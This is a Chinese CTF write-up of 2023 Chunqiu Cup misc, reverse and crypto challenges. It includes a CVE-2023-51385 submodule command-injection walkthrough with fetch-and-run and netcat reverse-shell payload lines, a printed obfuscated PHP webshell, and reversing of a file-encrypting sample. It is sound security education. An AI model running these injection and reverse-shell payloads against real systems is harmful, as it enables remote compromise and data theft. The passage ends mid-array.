# 【WP】2023年春秋杯冬季赛misc、reverse、crypto类题目解析

> 原文: https://www.ctfiot.com/159740.html
> ID: 159740

modules

本题所复现的是2023年12月中旬的一个OpenSSH ProxyCommand配置项未进行正确的过滤所引起的命令注入漏洞（CVE-2023-51385）。

OpenSSH的配置项ProxyCommand里允许执行shell命令。而%h参数将引用主机名，如果恶意的主机名里包含反引号`或者$()，将可以在shell中执行命令。

已知内容

~/.ssh/config内容：

host *.ichunqiu.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:
8080 %h %p

部署方式：

--recurse-submodules
# 在克隆Git仓库的时候，同时初始化并更新仓库中的所有子模块

解题过程

编写.gitmodules

ssh://`命令语句`foo.ichunqiu.com/bar

参考命令语句：

curl IP | bash
nc IP PORT1 |bash|nc IP PORT2
bash exp.sh
# 命令中出现/会解析错误，可以把命令写入exp.sh再执行
cat /flag > /var/www/html/flag

构造一个git项目直接添加一个.gitmodules文件是行不通的，.git目录下必须有modules文件夹。以下提供了2个方法。
修改别人的项目

git clone https://github.com/vin01/poc-proxycommand-vulnerable
cd poc-proxycommand-vulnerable && vi .gitmodules
# 修改url里的命令语句
git add .
git commit -m "gamelab"

从头弄一个项目

mkdir gamelab && cd gamelab
git init .
# 没法直接添加不存在的地址
git submodule add https://github.com/chunqiugame/test cve
vi .gitmodules
# 修改url里的命令语句
git add .
git commit -m "gamelab"

把git项目给推送到git仓库，然后再在题目里部署，执行命令即可。

谁偷吃了我的外卖

拿到图片之后，放入010 Editor，翻一翻可以看到里面存在压缩包并有明显提示（或者通过binwalk检测出里面有zip压缩包），之后可用foremost进行分离文件，可以得到里面的压缩包。

压缩包里面有提示，flag文件夹里面就是flag

I can give you a hint: – = / But there was a takeaway that was partially eaten.

可以看到用户1的文件名是不全的，并且文件尾部存在=号，并提示-等于/，根据base64特征可得知有可能所有文件名_后面部分拼接起来为一串base64，并且base64以4个一组，文件名也为4个一组，所以用户1的值未知可以先不用管它，写一个脚本将所有文件名所需拼接部分提取出来并进行拼接并将其中的-替换为/。

exp.py

import base64
import re
import zipfile

# 获取文件名称列表
zip_file_path = '外卖箱.zip'

with zipfile.ZipFile(zip_file_path, 'r',) as zip_ref:
    # 获取压缩包中所有文件的列表
    file_list = zip_ref.namelist()
    file_list_decoded = [file.encode('cp437').decode('gbk') for file in file_list]

# 打印文件列表
# print(file_list_decoded)

# 获取base64信息
base64_data_list = []
for i in file_list_decoded:
    try:
        base64_data = re.search(r"用户(d+)_([w+-=]{4})的外卖", i).groups()
        base64_data_list.append(base64_data)
    
except:
        # print(i)
        pass

# 按照用户编号进行排序
base64_data_list_sorted = sorted(base64_data_list, key=lambda i: int(i[0]))
# print(base64_data_list_sorted)

# base64值
base64_data_str_raw = ''.join([i[1] for i in base64_data_list_sorted])

# 根据提示替换掉其中的-为/
base64_data_str = base64_data_str_raw.replace('-', '/')
print(base64_data_str)

将得到的base64密文解码之后解码，然后保存解密后的密文到本地

用010 Editer打开，翻到结尾可以看到zip的文件尾504b0506，那猜测前面丢失的用户1的文件名数据为zip文件头，那么就再修改脚本将其补充上，然后保存为zip

exp.py（拼接上面的脚本）

# 添加文件头
zip = "504b03"
base64_data_str = base64.b64encode(bytes.fromhex(zip)).decode() + base64_data_str

# 保存压缩包
with open("key.zip", "wb") as f:
    f.write(base64.b64decode(base64_data_str))

查看小凯的奋斗故事可以得到前一部分的flag，钥匙的图片给出了压缩包压缩的方式，由此可推测为明文攻击，查看CRC确实一样

flag{W1sh_y0u_AaaAaaaa

尝试明文攻击，成功

根据文件名称可以推测，flag为倒置，给它正过来再拼接一下即可获得flag

明文混淆

明文攻击解压缩包，license找到文件大小最相近的进行明文攻击。

对比大小后最可能的是gpl-3.0协议。

https://choosealicense.com/licenses/gpl-3.0/#

bkcrack明文攻击压缩包得到混淆webshell。

打印eval执行函数得到是base64_decode函数，解密base64

使用echo输出

<?php  
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");  
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};  
  
$O0O000="NoJpuRUVQdeXLBwFaEvMPhtCIxlAYrHDsOynWScjTKkZgmbqGifzkLexbWjMsNrBOgcRInyZCdaAzEqUfvJDGTtuwQFKhiVmSXPoYlpHCD9cIJUimBmdPAdurXqbmXEdNYjLfXRHmhf0B2Wqf29VmQSuMhguNRZ4rqeKWVkiWA9gjnWyPRNjTJWiMnG4Nj5HN3s4WnNCFuxeF2qzmVqhkYa2huxmruxMIKR5MVmMMVa4MXL5MHg0FXknsjn9CQFxiQV7zUL/CS==";  
echo htmlspecialchars('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));  
?>

得到第二层加密密文

?><?php eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='))); ?>

直接使用曾哥写好的解密脚本梭哈。

解密脚本：

<?php  
//放入已经加密的PHP内容  
$a = "eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==')));";  
function decodephp($a)  
{  
    $max_level = 300; //最大层数  
    for ($i = 0; $i < $max_level; $i++) {  
        ob_start();  
        eval(str_replace('eval', 'echo', $a));  
        $a = ob_get_clean();  
        if (strpos($a, 'eval(gzinflate(base64_decode') === false) {  
            return $a;  
        }  
    }}  
//这里注意要加htmlspecialchars，我看好多文章没写  
echo htmlspecialchars(decodephp($a));  
?>

file_encryptor

行为分析

TLS

int __stdcall TlsCallback_0(int a1, int a2, int a3)
{
  int result; // eax

  result = (unsigned __int8)byte_405034;
  if ( byte_405034 )
  {
    MEMORY[0] = 42;//会触发异常
    byte_405034 = 0;
  }
  return result;
}

转到反汇编可以发现异常处理机制

跟进结构体stru_403828可以定位到异常处理例程，这里不再跟进，对TLS进行patch还原，nop范围如下：

.text:
004018A0 ; int __stdcall TlsCallback_0(int, int, int)
.text:
004018A0 public TlsCallback_0
.text:
004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:
TlsCallbacks↓o
.text:
004018A0
.text:
004018A0 var_20= dword ptr -20h
.text:
004018A0 var_1C= dword ptr -1Ch
.text:
004018A0 ms_exc= CPPEH_RECORD ptr -18h
.text:
004018A0
.text:
004018A0 ; __unwind { // __except_handler4
.text:
004018A0 55 push ebp
.text:
004018A1 8B EC mov ebp, esp
.text:
004018A3 6A FE push 0FFFFFFFEh ; -------------nop
.text:
004018A5 68 28 38 40 00 push offset stru_403828
.text:
004018AA 68 5F 21 40 00 push offset __except_handler4
.text:
004018AF 64 A1 00 00 00 00 mov eax, large fs:0
.text:
004018B5 50 push eax
.text:
004018B6 83 C4 F0 add esp, 0FFFFFFF0h
.text:
004018B9 53 push ebx
.text:
004018BA 56 push esi
.text:
004018BB 57 push edi
.text:
004018BC A1 04 50 40 00 mov eax, ___security_cookie
.text:
004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
.text:
004018C4 33 C5 xor eax, ebp
.text:
004018C6 50 push eax
.text:
004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
.text:
004018CA 64 A3 00 00 00 00 mov large fs:0, eax
.text:
004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
.text:
004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
.text:
004018DA 85 C0 test eax, eax
.text:
004018DC 74 79 jz short loc_401957
.text:
004018DC
.text:
004018DE ; __try { // __
except at loc_401916
.text:
004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
.text:
004018E5 FF 15 44 30 40 00 call ds:
IsDebuggerPresent
.text:
004018E5
.text:
004018EB 85 C0 test eax, eax
.text:
004018ED 74 08 jz short loc_4018F7
.text:
004018ED
.text:
004018EF 6A 00 push 0 ; Code
.text:
004018F1 FF 15 F4 30 40 00 call ds:
__imp_exit
.text:
004018F1
.text:
004018F7 ; ---------------------------------------------------------------------------
.text:
004018F7
.text:
004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
.text:
004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
.text:
004018FE 8B 4D E0 mov ecx, [ebp+var_20]
.text:
00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
.text:
00401901 ; } // starts at 4018DE
.text:
00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
.text:
0040190E EB 40 jmp short loc_401950
.text:
0040190E
.text:
00401910 ; ---------------------------------------------------------------------------
.text:
00401910
.text:
00401910 loc_401910: ; DATA XREF: .rdata:
stru_403828↓o
.text:
00401910 ; __
except filter // owned by 4018DE
.text:
00401910 B8 01 00 00 00 mov eax, 1
.text:
00401915 C3 retn
.text:
00401915
.text:
00401916 ; ---------------------------------------------------------------------------
.text:
00401916
.text:
00401916 loc_401916: ; DATA XREF: .rdata:
stru_403828↓o
.text:
00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
.text:
00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
.text:
00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
.text:
00401920 EB 09 jmp short loc_40192B
.text:
00401920
.text:
00401922 ; ---------------------------------------------------------------------------
.text:
00401922
.text:
00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
.text:
00401922 8B 55 E4 mov edx, [ebp+var_1C]
.text:
00401925 83 C2 01 add edx, 1
.text:
00401928 89 55 E4 mov [ebp+var_1C], edx
.text:
00401928
.text:
0040192B
.text:
0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
.text:
0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
.text:
0040192F 7D 18 jge short loc_401949
.text:
0040192F
.text:
00401931 8B 45 E4 mov eax, [ebp+var_1C]
.text:
00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
.text:
0040193B 83 F1 22 xor ecx, 22h
.text:
0040193E 8B 55 E4 mov edx, [ebp+var_1C]
.text:
00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
.text:
00401947 EB D9 jmp short loc_401922
.text:
00401947
.text:
00401949 ; ---------------------------------------------------------------------------
.text:
00401949
.text:
00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
.text:
00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
.text:
00401949
.text:
00401950
.text:
00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
.text:
00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
.text:
00401950
.text:
00401957
.text:
00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
.text:
00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
.text:
0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
.text:
00401961 59 pop ecx ; ------nop
.text:
00401962 5F pop edi
.text:
00401963 5E pop esi
.text:
00401964 5B pop ebx ; -----nop
.text:
00401965 8B E5 mov esp, ebp
.text:
00401967 5D pop ebp
.text:
00401968 C2 0C 00 retn 0Ch
.text:
00401968 ; } // starts at 4018A0
.text:
00401968
.text:
00401968 TlsCallback_0 endp

还原后代码如下：

byte_40501C为字符串W3lc0m3_t0_Th3_ctf_C1ub,猜测可能为秘钥之类。

main

同样注意到异常隐藏，处理方式与TLS相同。注意到如下位置，IDA分析失败

跟进sub_402140可以发现此处修改返回地址+1而导致程序指令流跨过一个字节执行。根据此原理修复花指令如下：

还原效果：

可见程序读取了资源，并将内容进行简单的异或，我们提取资源，这里使用Resource Hacker

对内容进行转存解密，简单脚本如下

def xor_encrypt(input_file_path, output_file_path, key):
    try:
        with open(input_file_path, 'rb') as input_file:
            content = input_file.read()
            encrypted_content = bytes([byte ^ key for byte in content])

            with open(output_file_path, 'wb') as output_file:
                output_file.write(encrypted_content)
    
except Exception as e:
        print(str(e))

input_file_path = 'DATA101.bin'
output_file_path = 'DATA101_out.bin'
encryption_key = 0x33  

xor_encrypt(input_file_path, output_file_path, encryption_key)

查看解密之后的文件的属性，发现为cryptsp.dll属于windows加密组件的一部分

回到main，函数sub_401CE0经过简单分析可以得出函数行为：读取dll内容，映射到内存中并完成dll装载。

还原函数loc_401320，同样注意到花指令如下，同上述处理方式相同，不再赘述。

还原并简单分析效果如下：

跟进函数sub_401210

可以发现函数体中使用sub_401BB0多次获取了函数，通过动调可以得出dword_40541C为cryptsp.dll的基地址，可以联想到病毒行为中的通过自映射一份dll来调用其中函数来跳过一些杀软的GetProcAddress检测，类比的sub_401BB0更名为GetProcAddress_0，分析可以得出程序中GetProcAddress_0的调用都是通过序列号调用的，则可以通过序号定位所调用的函数。

通过分析我们大致了解了程序的特性，接下来我们定位到读取文件的位置，大概率加密逻辑就在附近，跟进到函数sub_4013E0

可以发现有写文件的逻辑，推测在WriteFile时已经完成了加密，那么比较容易推测v6(*a1, 0, FileSize == 0, 0, lpBuffer, &NumberOfBytesRead, dwBytes)这一句完成了加密。通过之前的方法，可以得出v6为函数CryptEncrypt。在这里我们可以使用Hook的方法，通过将CryptEncrypt函数替换为CryptDecrypt来完成解密。

这里需要提到的是，简单分析题目逻辑可以发现题目打开桌面上的document文档下的文件进行加密，所以需要再桌面上创建document文档并将加密后的文件放入document文件夹中。

exp

function main(){
    HookGetProcAddress();
}
function HookGetProcAddress(){
    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:
00001BB0
        onEnter(args){
            let ordinal = args[1].toInt32();
            console.warn(`ordinal--->${ordinal}`);
            if(ordinal == 11){
                args[1]= ptr(0x5);//0x5为CryptDecrypt函数序号，替换CryptEncrypt为CryptDecrypt,这里可以这么替换是因为两个API签名非常相似且完全互逆
                //这里没有处理参数问题，通常情况下会导致栈崩，读者可以自行处理（Patch掉CryptEncrypt最后一个参数即可）
            }
        },
        onLeave(retVal){
        }
    })
}

setImmediate(main)
//工具信息
// pip list | findstr frida
// frida              15.0.16
// frida-tools        10.2.1
//命令
//frida -f "Pathtofile_encryptor - 复制.exe" -l .hook_file_enc.js --no-pause

运行得到flag：

或使用如下类似脚本完成AES_CBC_256解密

#include 
#include <windows.h>

using namespace std;

int main()
{
 HCRYPTPROV hProv;
 HCRYPTKEY hKey;
 char key[] = { 0x46, 0x4A, 0x06, 0xD9, 0x21, 0x14, 0x59, 0xE5, 0x65, 0x49, 0x35, 0xEE, 0x79, 0x4A, 0x35, 0xD9, 0x65, 0x1F, 0x35, 0xF9, 0x20, 0x0C, 0x08 };//经过处理后的最终秘钥
 char fileName[] = { "1.txt" };//文件名的散列值作为IV
 char cipher[] = { 0x79, 0xD1, 0x3D, 0xDA, 0x2F, 0x98, 0x53, 0x67, 0x20, 0x3B, 0x38, 0x02, 0x32, 0x49, 0x7E, 0x3F, 0xA2, 0x74, 0x97, 0x23, 0x0A, 0x3C, 0x9F, 0x36, 0xFE, 0x35, 0x09, 0x3C, 0x35, 0xBD, 0xF8, 0x1B, 0x23, 0xC9, 0x51, 0xEB, 0x1F, 0xCD, 0xD2, 0xE8, 0xEB, 0xE0, 0xD0, 0x47, 0x95, 0xE8, 0xC2, 0x63 };

 if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0)) {
  if (GetLastError() != NTE_BAD_KEYSET)
   return 0;
  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET))
   return 0;
 }

 HCRYPTHASH hHash = NULL;
 if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash) || !hHash)
  return 0;

 char result = 0;
 if (CryptHashData(hHash, (const BYTE*)key, sizeof(key), 0) && CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
  result = 1;
 }

 DWORD mode = 1;
 if (CryptSetKeyParam(hKey, KP_MODE, (const BYTE*)&mode, 0)) {
  result = 0;
 }

 CryptDestroyHash(hHash);

 if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
  return 0;
 }

 if (CryptHashData(hHash, (const BYTE*)fileName, sizeof(fileName) - 1, 0)) {
  BYTE iv[16] = { 0 };
  DWORD len = sizeof(iv);

  if (CryptGetHashParam(hHash, HP_HASHVAL, iv, &len, 0) && CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
   result = 1; // 成功
  }

  CryptDestroyHash(hHash); // 释放散列对象
  DWORD cipherLen = 0x30;

  if (!CryptDecrypt(hKey, 0, 1, 0, (BYTE*)cipher, &cipherLen)) {
  }

  std::
cout.write(reinterpret_cast<char*>(cipher), cipherLen);
  std::
cout << std::
endl;

  return 0;
 }
}

coos

1、DIE查壳

减小不必要的难度，并没有加壳

2、使用COT花指令

反汇编软件分析

发现很多无关紧要的代码，干扰分析

这里推荐使用脚本去除，因为模板都是一样的。

#define AStupid_GetInteger(in, out){
string Integer = std::
to_string(in);
int ret = 0;
std::
string::
reverse_iterator rbegin = Integer.rbegin();
std::
string::
reverse_iterator rend = Integer.rend();
int i = 0;
while ((rbegin != rend) &&
    ((*rbegin == '0') ||
        (*rbegin == '1') ||
        (*rbegin == '2') ||
        (*rbegin == '3') ||
        (*rbegin == '4') ||
        (*rbegin == '5') ||
        (*rbegin == '6') ||
        (*rbegin == '7') ||
        (*rbegin == '8') ||
        (*rbegin == '9')))
{
    ret += (*rbegin - '0') * pow(10, i++);
    rbegin++;
}

if (rbegin == rend)
{
    Integer.clear();
}
else
{
    Integer.~basic_string();
}
out = ret;
}

字符串搜索发现字符串被加密隐藏

尝试运行

程序跑飞，说明存在反调试

大多数会在main找，其实反调试函数在init区，为了减小难度，符号没去除，在导入表可以找到

去除该反调试，方法很多，直接nop掉即可

（以为反调试就这样吗？在后面的vm代码中，会穿插反调试hhhh，使用opcode转发执行反调试，去除方法：直接将该opcode->nop掉）

2、使用的混淆思路源自COP混淆器

减小了难度，并没有对每个正常指令后使用该混淆序列，而是随机穿插

主要去除方法还是使用脚本来自动化去除

#define MY_CONFUSE  _asm {_emit 0x55 }_asm {_emit 0xe8}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0x5d}_asm {_emit 0x48}_asm {_emit 0x83}_asm {_emit 0xc5}_asm {_emit 0x08}_asm {_emit 0x55}_asm { ret }_asm {_emit 0xe8}_asm {_emit 0x5d}

import idc
start_add = 0x0040346A #自定义起始位置
end_add = 0x00403486  #自定义终止位置
for i in range(start_add,end_add):
    if idc.get_wide_dword(i) == 0x0000E855 and idc.get_wide_dword(i+4)==0x485D0000 and idc.get_wide_dword(i+8)==0x5508C583:
        for mm in range(15):
            ida_bytes.patch_byte(i+mm,0x90)
        i=i+15
print("finsh")

nop掉后的效果

修正后的效果

3、VM保护借鉴了VMP保护的思路，对关键的代码进行保护，减小体积。对关键的信息进行加密隐藏。

将前面所有对抗干扰的工作（去除反调试、混淆和花指令）接下来就是分析题目的VM

不像常见的整体vm，本题使用了对核心加密进行vm化，借鉴了VMP保护器的思路

加密也是使用了自定义的present魔改加密（分析需要5-6小时），不能黑盒爆破

虚拟机函数

对这4组函数加密，进行分析，然后得到对应的opcode和加密逻辑，输出即可

提取关键的vm->opcode

这是Pboxplayer的对应核心opcode

mov     efx,0  //output初始返回值为0       
mov     rex,var_state //state是用户输入的值 -> 手动赋值
mov     ecx,0  //初始化 i 值

mov     ebx, rex
shr     ebx, ecx  //state >> ecx
mov     eax, ebx
and     eax, 0x1  //eax & 0x01
mov     ebx, Pbox[ecx] //ebx=var_sbox[i]
shl     eax,ebx   //eax << ebx
add     efx, eax

int pLayer_opcode[] = { 66,0,57,0,67,74,1,55,1,75,76,77 
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
,73,67,74,1,55,1,75,76,77
};

Sboxplayer

mov     efx,0  //output初始返回值为0
mov     rex,var_state //state是用户输入的值
mov     ecx,0  //初始化 i 值

->2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
mov     eax, ecx
shl     eax, 2  //i<<2

mov     ebx,rex
shr     ebx, eax //state >> eax(i<<2)
mov     eax,ebx
and     eax, 0xF  //eax & 0xf

mov     ebx, var_sbox[eax] //ebx=var_sbox[eax]

mov     edx, ecx
shl     edx, 2  // i << 2

shl  ebx,edx //Sbox[(state >> (i * 4)) & 0xF] << (i * 4)

add     efx, ebx //output+=

第二轮->73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 

add     ecx    
mov     eax, ecx
shl     eax, 2  //i<<2

mov     ebx,rex
shr     ebx, eax //state >> eax(i<<2)
mov     eax,ebx
and     eax, 0xF  //eax & 0xf

mov     ebx, var_sbox[eax] //ebx=var_sbox[eax]

mov     edx, ecx
shl     edx, 2  // i << 2

shl  ebx,edx //Sbox[(state >> (i * 4)) & 0xF] << (i * 4)

add     efx, ebx //output+=

对应opcode

int sBoxLayer_opcode[] = { 66,0,57,0,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
                           ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
 ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 };

4、秘钥流分布，使用了nProtect保护器的斐波那契数列分布，这样就导致key在程序中看不到，唯一的key转移到了斐波那契数列的生成函数

（静态key是经过加密的，只有在动态的时候才能获得正确的key流空间）

int* fibonacci_sequence(int n) {

    if (n <= 0) {
        return NULL;
    }

    int* sequence = (int*)malloc(n * sizeof(int));
    if (sequence == NULL) {
        return NULL;
    }

    sequence[0] = 0;
    if (n >= 2) {
        sequence[1] = 1;
    }
   
    for (int i = 2; i < n; i++) {
        sequence[i] = sequence[i - 1] + sequence[i - 2];
    }

    return sequence;
}   
//初始化秘钥流分布空间
    for (int i = 4; i < 36; i++) {
        index1[i - 4] = fibo[i] % 200;
    }
    //初始化密文分布空间
    for (int i = 4; i < 36; i++) {
        index2[i - 4] = fibo[i] % 200 - 2;
    }
    AStupid_GetInteger(right_con, right_con);
    //生成秘钥流
    for (size_t i = 0; i < 32; i++)
    {
        roundkeys[i] = rounds[index1[i]];
    }

分析成功将会得到key和密文

（init区可以得到）

5、整理代码

使用python写出解密算法

def sBoxLayer_dec(state):
    output = 0
    for i in range(16):
            output += Sbox_inv[( state >> (i*4)) & 0xF] << (i*4)
    return output

def pLayer_dec(state):
    output = 0
    for i in range(64):
            output += ((state >> i) & 0x01) << PBox_inv[i]
    return output

def generateRoundkeys80(key,rounds):
    roundkeys = []
    for i in range(1,rounds+1,1):
            roundkeys.append(key >>16)
            key = ((key & (2**19-1)) << 61) + (key >> 19)
            key = (Sbox[key >> 76] << 76)+(key & (2**76-1))
            key ^= (i << 15)^(key >> 19)
    return roundkeys

def string2number(i):
    return sum([ord(i[c])<<(8*c) for c in range(8)])

#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
Sbox= [2, 1, 7, 4, 8, 15, 14, 3, 13, 10, 0, 9, 11, 6, 5, 12]
Sbox_inv = [Sbox.index(x) for x in range(16)]
PBox = [63, 47, 31, 15, 62, 46, 30, 14, 61, 45, 29, 13, 60, 44, 28, 12, 59, 43, 27, 11, 58, 42, 26, 10, 57, 41, 25, 9, 56, 40, 24, 8, 55, 39, 23, 7, 54, 38, 22, 6, 53, 37, 21, 5, 52, 36, 20, 4, 51, 35, 19, 3, 50, 34, 18, 2, 49, 33, 17, 1, 48, 32, 16, 0]

PBox_inv = [PBox.index(x) for x in range(64)]

def addRoundKey(state,roundkey):
    return state ^ roundkey ^0x33

def fibonacci_sequence(n):
    sequence = [0, 1]  # 初始化斐波那契序列的前两个数字：0和1

    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return sequence

    while len(sequence) < n:  # 循环生成斐波那契序列直到达到指定的长度n
        next_num = sequence[-1] + sequence[-2]  # 下一个数字是前两个数字的和
        sequence.append(next_num)

    return sequence

def decrypt(blocks):
    rounds = 32
    #
    roundkeys=[0]*32
    roundkeyse = [7596569225765413736, 14892793705278438672, 14897626102458855899, 7596569225765413736, 17864553494577085546, 14892793705278438672, 8911548945514081943, 3235953879216500034, 14897626102458855899, 14479365304648704483, 12487849248796427385, 1910441527462264642, 13416156134946011488, 15127138055849948981, 8053781650739871525, 9558394794771259844, 4339208423645057876, 16476906405380659427, 1807992343561743431, 1406977800464934583, 2088792745124906531, 17864553494577085546, 2503949348962038751, 1807992343561743431, 1910441527462264642, 12099790537768180319, 3656171727515946310, 8846275897411559763, 15016467168181810528, 10680376501786139932, 127218696325272760, 14650765194520711557, 18098636559166672791, 14479365304648704483, 1138107802150484470, 17425455315140320773, 10198946212698018051, 11675060805246078665, 7845721200158713852, 3875007888812939442, 3656171727515946310, 12832871479181253491, 12410622898566042525, 9465341475329433169, 13583217096077143512, 6301729392893456095, 2168528496026060067, 12316349504233001197, 18362840922027745513, 13260577361799918013, 9375235773617100783, 1434873936841022587, 15894990822144765454, 9174558636579464892, 3911140030477916483, 8911548945514081943, 7511645037799218409, 1406977800464934583, 789773534177065638, 5619587304330944242, 1138364271574112099, 15270223665874596666, 888787990464115031, 3288300899668044535, 2825799114396096089, 14650765194520711557, 15855898561898929428, 16434979759999898092, 17186863530111937934, 8846275897411559763, 13383458534377263128, 14040798036187346358, 5201571114788515367, 3296684121573256125, 17649038654173134582, 8311235844848943341, 17304888526702360563, 12082008748672769437, 18004313578307362101, 18283629926380646384, 6127487139705221369, 13597666037573546496, 14310204607435121827, 11534823455148134974, 4781200239629066311, 1438770569267924920, 6709389128783980755, 127218696325272760, 10021575829474275942, 3235953879216500034, 11434425911176089405, 17424160790679890463, 1542479114789371041, 13306612673770109971, 15023354262989414273, 6928706711215843857, 7713576981387933364, 4542208431133597405, 17682109934842163371, 